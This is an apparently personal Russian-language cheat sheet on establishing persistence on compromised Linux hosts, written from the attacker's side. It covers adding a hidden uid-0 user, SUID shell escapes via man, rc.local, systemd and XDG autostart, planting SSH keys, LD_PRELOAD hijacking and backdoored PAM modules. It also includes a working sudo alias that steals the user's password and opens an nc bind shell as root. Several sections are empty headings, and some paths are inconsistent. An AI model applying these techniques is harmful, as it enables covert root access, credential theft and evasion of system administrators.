# Закрепление в Linux

## Новый пользователь

Создание нового пользователя с необычным uid и именем:
`sudo useradd -o -u 0 -g 0 -s /bin/bash deamon`

Есть способ создать пользователя без записи в файл `/etc/passwd`. Для этого можно в файле `/etc/nsswitch.conf` определить альтернативную базу passwd.

## Смена переменной окружения PATH или secure_path в sudoers

## Использование уязвимости команды less

## Прописаться в cron от "демона"

## Добавление файла /etc/ssh/sshrc
Добавление ip в black list: /etc/hosts.deny

## Использование SUID

```
man_path=$(where man)
chmod u+s $man_path/man
```

Эксплуатация:

```
man man
!/bin/sh
```

Также можно прочитать файл: `man file_to_read`

Аналогично для jounralctl

## Добавление файла rc.local в /etc

Файл rc.local выполняет скрипты после сразу после старта ОС. При старте системы, скрипты выполняются с правами root.
Сначала необходимо включить сервис: `sudo systemctl enable rc-local`

`sudo nano /etc/rc.local`

```
#!/bin/bash
# Здесь скрипт
exit 0
```

`sudo chmod +x /etc/rc.local`

## Добавление ключа SSH

Добавить ключи в `~/.ssh/authorized_keys`. Но должны быть права `rw-------`

## Автозагрузка после системы инициализации

Необходимо создать unit-файл:

```
[Unit]
Description=My Script Service
After=multi-user.target
[Service]
Type=idle
ExecStart=/usr/bin/local/script.sh
[Install]
WantedBy=multi-user.target
```

Нужный файл сделать исполняемым: `sudo chmod u+x /usr/local/bin/script.sh`.
Также включить службу: `sudo systemctl enable myscript.service`

Unit-файлы обычно лежат в следующих каталогах:

1. `/usr/lib/systemd/system/` - юниты из установленных пакетов RPM — всякие nginx, apache, mysql и прочее
2. `/run/systemd/system/` - юниты, создаваемые на лету
3. `~/.config/systemd/user/` - этот путь будет вам полезен, если вы не смогли подняться до root. Тут лежат user-mode services.
4. `/etc/systemd/system/` - юниты, созданные системным администратором. Сюда можно размещать свои unit-файлы. А можно внести изменения в уже существующие, что будет менее заметно.

## Прописаться в окружения рабочего стола - XDG autostart

Большинство окружений рабочих столов (desktop environments) и менеджеров окон (windows managers) поддерживают автозагрузку программ (XDG autostart). Сущности хранятся в `~/.config/autostart` или `/etc/xdg/autostart/`. Код, определенный в этих файлах исполняется при входе пользователя и загрузки среды рабочего стола. Команды выполняются в контексте залогиневшегося пользователя. На самом деле пути ~/.config/autostart и /etc/xdg/autostart/ определены переменными окружения $XDG_CONFIG_HOME и $XDG_CONFIG_DIRS

```
[Desktop Entry]
Type=Application # Определяет тип сущности: приложение (application), ссылка (link) или каталог (directory)
Name=Welcome  # Имя определенное создателем сущности
Exec=/var/lib/gnome-welcome-tour  # Команда с аргументами, которую необходимо выполнить
```

## .bashrc, .bash_profile

## Добавить alias

`alias sudo='echo -n "[sudo] password for \$USER: ";read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '`

## docker escape

Запускаем докер с необходимым capabilities

## Dynamic Link Hijacking

Как создаются утилиты операционной системы? Пишется код, который потом компилируется. Код хотя бы немного продвинутой и сложной утилиты - это не один файл, а несколько, которые подключаются как библиотеки к основному. Библиотеки бывают статическими и динамическими. Статические нам неинтересны - на этапе компиляции их код целиком помещается в исполняемый файл, и мы мало можем на него повлиять. То ли дело динамические! Это отдельные файлы, независимые, которые лежат где-то в операционной системе. При запуске утилита с внешними зависимостями ищет нужные библиотеки в операционной системе. Вот тут мы и можем вмешаться.

Для начала нам надо найти такую утилиту, которая использует динамическую библиотеку. Понять, какая функция вызывается. В этом нам поможет утилита `ltrace`, она позволяет вывести вызовы всех внешних функций. Затем мы создаем свою библиотеку с таким же именем и определяем в ней такую же функцию. Важно, чтобы сигнатура нашей функции совпадала с сигнатурой исходной легитимной функции. Компилируем и размещаем в целевой системе.

Как же нам заставить теперь бинарный файл утилиты использовать нашу библиотеку? Нам поможет особенность динамического линковщика, он первыми загружает библиотеки, определенные в переменной `LD_PRELOAD`, и эти библиотеки имеют приоритет над остальными. То есть нам достаточно изменить переменную среды окружения `LD_PRELOAD`. Один из способов - export в `.bashrc`. Тоже самое можно сделать в файлах `/etc/environment` или `/etc/security/pam_env.conf`.

##

Pluggable Authentication Modules - модули для аутентификации, как несложно догадаться по переводу. До появления PAM администратору приходилось пройти все 12 кругов ада, чтобы настроить какую-то внешнюю систему аутентификации. Сейчас надо изменить пару строчек в паре конфигурационных файлов. Если в файле `/etc/pam.d` для всех модулей выставить control_flag в значение `optional`, то мы сможет входить в систему вообще без пароля. Как и администраторы. Поэтому наш бекдорчик быстро найдут и закроют точку входа.

Чуть менее заметный ход - написать свой собственный модуль. Файл с ним необходимо разместить с другими модулями по пути /lib/x86_64-linux-gnu/security/. Что вы там реализуете, дело вашей фантазии: волшебный пароль, который открывает все двери, или логирование паролей других пользователей, а можно сразу открытие бекконнекта (why not?). Можно добавить свой модуль, можно заменить уже существующий. Берем исходники, делаем закладку, собираем и замещаем. Готово, вы прекрасны!
